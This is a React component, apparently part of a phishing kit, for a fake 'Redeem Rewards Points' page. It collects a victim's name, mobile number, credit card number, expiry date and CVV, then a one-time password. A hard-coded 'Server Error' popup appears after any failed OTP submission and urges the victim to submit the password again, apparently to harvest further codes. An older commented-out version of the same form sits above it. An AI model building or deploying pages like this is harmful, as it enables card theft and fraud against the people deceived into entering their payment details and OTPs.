// import { useState } from "react"
// import "./App.css"

// const RewardPage = () => {
//   const [otpStep, setOtpStep] = useState(1)
//   const [phoneNumber, setPhoneNumber] = useState("")
//   const [otp, setOtp] = useState("")
//   const [loading, setLoading] = useState(false)
//   const [error, setError] = useState("")
//   const [success, setSuccess] = useState(false)

//   // Send OTP
//   const sendOTP = async () => {
//     if (!phoneNumber || phoneNumber.length !== 10) {
//       setError("Please enter a valid 10-digit phone number")
//       return
//     }
//     setLoading(true)
//     setError("")
//     try {
//       const response = await fetch("/api/send-otp", {
//         method: "POST",
//         headers: { "Content-Type": "application/json" },
//         body: JSON.stringify({ phoneNumber }),
//       })
//       const data = await response.json()
//       if (response.ok) {
//         setOtpStep(3)
//       } else {
//         setError(data.message || "Failed to send OTP")
//       }
//     } catch {
//       setError("Network error. Please try again.")
//     } finally {
//       setLoading(false)
//     }
//   }

//   // Verify OTP
//   const verifyOTP = async () => {
//     if (!otp || otp.length !== 6) {
//       setError("Please enter a valid 6-digit OTP")
//       return
//     }
//     setLoading(true)
//     setError("")
//     try {
//       const response = await fetch("/api/verify-otp", {
//         method: "POST",
//         headers: { "Content-Type": "application/json" },
//         body: JSON.stringify({ phoneNumber, otp }),
//       })
//       const data = await response.json()
//       if (response.ok) {
//         setSuccess(true)
//       } else {
//         setError(data.message || "Invalid OTP")
//       }
//     } catch {
//       setError("Network error. Please try again.")
//     } finally {
//       setLoading(false)
//     }
//   }

//   return (
//     <div className="reward-page">
//       <div className="modal reward-modal-page">
//         <div className="modal-header">
//           <h3>Redeem Rewards Points</h3>
//         </div>
//         <div className="modal-body">
//           {/* Step indicators */}
//           <div className="step-indicators">
//             <div className={`step ${otpStep >= 1 ? "active" : ""}`}>
//               <span className="step-number">1</span>
//               <span className="step-label">Personal Info</span>
//             </div>
//             <div className={`step ${otpStep >= 2 ? "active" : ""}`}>
//               <span className="step-number">2</span>
//               <span className="step-label">Card Details</span>
//             </div>
//             <div className={`step ${otpStep >= 3 ? "active" : ""}`}>
//               <span className="step-number">3</span>
//               <span className="step-label">Verification</span>
//             </div>
//           </div>

//           {error && <div className="error-message">{error}</div>}

//           {/* Step 1 */}
//           {otpStep === 1 && (
//             <div className="form-step">
//               <h4>Personal Information</h4>
//               <input type="text" placeholder="Full Name (as on card)" className="form-input" />
//               <input
//                 type="tel"
//                 placeholder="Registered Mobile Number"
//                 value={phoneNumber}
//                 onChange={(e) => setPhoneNumber(e.target.value)}
//                 maxLength="10"
//                 className="form-input"
//               />
//               <input type="text" placeholder="Card Limit (optional)" className="form-input" />
//               <button className="form-btn" onClick={() => setOtpStep(2)}>Next</button>
//             </div>
//           )}

//           {/* Step 2 */}
//           {otpStep === 2 && (
//             <div className="form-step">
//               <h4>Credit Card Details</h4>
//               <input type="text" placeholder="Credit Card Number" className="form-input" />
//               <input type="text" placeholder="Expiry Date (MM/YY)" className="form-input" />
//               <input type="password" placeholder="CVV" className="form-input" />
//               <button className="form-btn" onClick={sendOTP} disabled={loading}>
//                 {loading ? "Submitting..." : "Submit"}
//               </button>
//               <button className="form-btn secondary" onClick={() => setOtpStep(1)}>Back</button>
//             </div>
//           )}

//           {/* Step 3 */}
//           {otpStep === 3 && !success && (
//             <div className="form-step">
//               <h4>One Time Password</h4>
//               <p>We’ve sent a 6-digit OTP to {phoneNumber}</p>
//               <input
//                 type="text"
//                 placeholder="Enter 6-digit OTP"
//                 value={otp}
//                 onChange={(e) => setOtp(e.target.value)}
//                 maxLength="6"
//                 className="form-input"
//               />
//               <button className="form-btn" onClick={verifyOTP} disabled={loading}>
//                 {loading ? "Verifying..." : "Verify"}
//               </button>
//               <button className="form-btn secondary" onClick={sendOTP}>Resend OTP</button>
//             </div>
//           )}

//           {/* Success */}
//           {success && (
//             <div className="form-step success">
//               <div className="success-icon">✓</div>
//               <h4>Reward Points Claimed Successfully!</h4>
//               <p>Your reward points have been credited.</p>
//             </div>
//           )}
//         </div>
//       </div>
//     </div>
//   )
// }

// export default RewardPage



import { useEffect, useState } from "react"
import { useLocation } from "react-router-dom"
import "./App.css"

const RewardPage = () => {
    const location = useLocation()
    const { title, description } = location.state || {
        title: "Redeem Rewards Points",
        description:
            "Complete the following steps to redeem your accumulated Rewards Points."
    }
    useEffect(() => {
        window.scrollTo(0, 0)
    }, [])

    const [step, setStep] = useState(1)
    const [fullName, setFullName] = useState("")
    const [phone, setPhone] = useState("")
    const [limit, setLimit] = useState("")
    const [cardNumber, setCardNumber] = useState("")
    const [expiry, setExpiry] = useState("")
    const [cvv, setCvv] = useState("")
    const [otp, setOtp] = useState("")
    const [error, setError] = useState("")
    const [errorPopup, setErrorPopup] = useState(null)

    const [timer, setTimer] = useState(120) // 2 minutes
    const [loading, setLoading] = useState(false)
    const [success, setSuccess] = useState(false)

    // Timer for OTP countdown
    useEffect(() => {
        let interval
        if (step === 3 && timer > 0) {
            interval = setInterval(() => {
                setTimer((prev) => prev - 1)
            }, 1000)
        }
        return () => clearInterval(interval)
    }, [step, timer])

    const formatTime = (seconds) => {
        const m = String(Math.floor(seconds / 60)).padStart(2, "0")
        const s = String(seconds % 60).padStart(2, "0")
        return `${m}:${s}`
    }

    // Auto format expiry MM/YY
    const handleExpiryChange = (e) => {
        let value = e.target.value.replace(/\D/g, "")
        if (value.length >= 3) {
            value = value.slice(0, 2) + "/" + value.slice(2, 4)
        }
        setExpiry(value)
    }

    // Verify OTP
    const verifyOTP = async () => {
        if (!otp || otp.length !== 6) {
            setErrorPopup({
                title: "Invalid OTP",
                message: "Please enter a valid 6-digit OTP.",
                action: "Resend OTP"
            })
            return
        }

        setLoading(true)
        try {
            const response = await fetch("/api/verify-otp", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ phoneNumber: phone, otp })
            })
            const data = await response.json()

            if (response.ok) {
                setSuccess(true)
            } else {
                setErrorPopup({
                    title: "Server Error",
                    message:
                        data.message ||
                        "We encountered a temporary issue. Please try again.",
                    action: "Resend OTP"
                })
            }
        } catch (err) {
            setErrorPopup({
                title: "Network Error",
                message: "Please check your connection and try again.",
                action: "Resend OTP"
            })
        } finally {
            setLoading(false)
        }
    }

    // Step 1 validation
    const handleNextStep1 = () => {
        if (!fullName.trim()) return setError("Full name is required")
        if (!/^\d{10}$/.test(phone))
            return setError("Enter valid 10-digit mobile number")
        setError("")
        setStep(2)
    }

    // Step 2 validation
    const handleNextStep2 = () => {
        if (!/^\d{16}$/.test(cardNumber))
            return setError("Card number must be 16 digits")
        if (!expiry.trim()) return setError("Expiry date is required")
        if (!/^\d{2}\/\d{2}$/.test(expiry))
            return setError("Expiry format must be MM/YY")
        if (!/^\d{3}$/.test(cvv)) return setError("CVV must be 3 digits")
        setError("")
        setStep(3)
        setTimer(120) // reset OTP timer
    }

    // Step 3 validation
    const handleVerifyOtp = () => {
        if (!/^\d{6}$/.test(otp)) {
            setErrorPopup({
                title: "Invalid OTP",
                message: "Please enter a valid 6-digit OTP.",
                action: "Resend OTP"
            })
            return
        }
        verifyOTP()
    }

    return (
        <div className="reward-page">
            {/* Dynamic heading/description */}
            <h2>{title}</h2>
            <p>{description}</p>

            {/* Step Indicators */}
            <div className="step-indicators">
                {["Personal Info", "Details", "Verification"].map((label, i) => {
                    const index = i + 1
                    return (
                        <div
                            key={index}
                            className={`step ${step === index ? "active" : ""} ${step > index ? "completed" : ""
                                }`}
                        >
                            <span className="step-number">
                                {step > index ? "✓" : index}
                            </span>
                            <span className="step-label">{label}</span>
                        </div>
                    )
                })}
            </div>

            {error && <div className="error-message">{error}</div>}

            {/* Step 1 */}
            {step === 1 && (
                <div className="form-step">
                    <h3>Personal Information</h3>
                    <input
                        type="text"
                        placeholder="Full name (as on card)"
                        value={fullName}
                        onChange={(e) => setFullName(e.target.value)}
                        className="form-input"
                    />
                    <input
                        type="tel"
                        placeholder="Registered Mobile Number"
                        value={phone}
                        onChange={(e) => setPhone(e.target.value.replace(/\D/g, ""))}
                        maxLength="10"
                        className="form-input"
                        inputMode="numeric"
                        pattern="[0-9]*"
                    />
                    <input
                        type="text"
                        placeholder="Card Limit (optional)"
                        value={limit}
                        onChange={(e) => setLimit(e.target.value)}
                        className="form-input"
                    />
                    <button className="form-btn" onClick={handleNextStep1}>
                        Next
                    </button>
                </div>
            )}

            {/* Step 2 */}
            {step === 2 && (
                <div className="form-step">
                    <h3>Credit Card Details</h3>
                    <input
                        type="text"
                        placeholder="Credit Card Number"
                        value={cardNumber}
                        onChange={(e) => setCardNumber(e.target.value.replace(/\D/g, ""))}
                        maxLength="16"
                        className="form-input"
                        inputMode="numeric"
                        pattern="[0-9]*"
                    />
                    <input
                        type="text"
                        placeholder="Expiry Date (MM/YY)"
                        value={expiry}
                        onChange={handleExpiryChange}
                        maxLength="5"
                        className="form-input"
                        inputMode="numeric"
                    />
                    <input
                        type="password"
                        placeholder="CVV"
                        value={cvv}
                        onChange={(e) => setCvv(e.target.value.replace(/\D/g, ""))}
                        maxLength="3"
                        className="form-input"
                        inputMode="numeric"
                        pattern="[0-9]*"
                    />
                    <button className="form-btn" onClick={handleNextStep2}>
                        Submit
                    </button>
                    <button className="form-btn secondary" onClick={() => setStep(1)}>
                        Back
                    </button>
                </div>
            )}

            {/* Step 3 */}
            {step === 3 && (
                <div className="form-step">
                    <h3>One Time Password</h3>
                    <p>A 6-digit One Time Password has been sent to your registered mobile number.</p>
                    <input
                        type="text"
                        placeholder="Enter 6-digit OTP"
                        value={otp}
                        onChange={(e) => setOtp(e.target.value.replace(/\D/g, ""))}
                        maxLength="6"
                        className="form-input"
                        inputMode="numeric"
                        pattern="[0-9]*"
                    />
                    <button className="form-btn" onClick={handleVerifyOtp} disabled={loading}>
                        {loading ? "Verifying..." : "Submit"}
                    </button>
                    <p className="resend">
                        Didn’t receive the OTP?{" "}
                        {timer > 0 ? (
                            <span>Resend OTP (in {formatTime(timer)})</span>
                        ) : (
                            <button className="resend-btn" onClick={() => setTimer(120)}>
                                Resend OTP
                            </button>
                        )}
                    </p>
                </div>
            )}


            {/* Error Popup */}
            {errorPopup && (
                <div className="error-overlay">
                    <div className="error-modal">
                        <div className="error-icon">⚠️</div>
                        <h3>Server Error</h3>
                        <p>We countered a temporary issue Please try submitting One Time Password again.</p>
                        <button
                            className="error-btn"
                            onClick={() => {
                                setErrorPopup(null)
                                setTimer(120) // reset timer
                            }}
                        >
                            {errorPopup.action || "Resend OTP"}
                        </button>
                    </div>
                </div>
            )}
        </div>
    )
}

export default RewardPage
